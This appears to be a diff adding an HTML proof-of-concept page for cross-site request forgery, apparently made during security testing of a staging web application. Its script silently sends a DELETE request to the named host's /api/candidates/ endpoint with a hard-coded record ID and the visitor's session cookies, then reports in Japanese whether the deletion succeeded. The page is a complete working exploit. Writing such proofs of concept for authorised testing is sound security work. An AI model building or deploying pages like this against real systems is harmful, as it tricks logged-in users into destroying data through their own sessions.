@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"></head>
+<body>
+<h2>CSRF PoC — DELETE</h2>
+<div id="result">送信中...</div>
+
+<script>
+const CANDIDATE_ID = "50591b46-f793-4907-9263-201439a1837a";
+const BASE = "https://lykeion-stg-monte-web-z2u2jj6qsq-an.a.run.app";
+
+fetch(`${BASE}/api/candidates/${CANDIDATE_ID}`, {
+  method: "DELETE",
+  credentials: "include",
+  mode: "cors",
+  headers: { "Content-Type": "application/json" }
+})
+.then(r => {
+  document.getElementById("result").textContent
+    = "ステータス: " + r.status + (r.status === 204 ? " → 削除成功 ⚠" : "");
+})
+.catch(e => {
+  document.getElementById("result").textContent = "エラー: " + e;
+});
+</script>
+</body>
+</html>
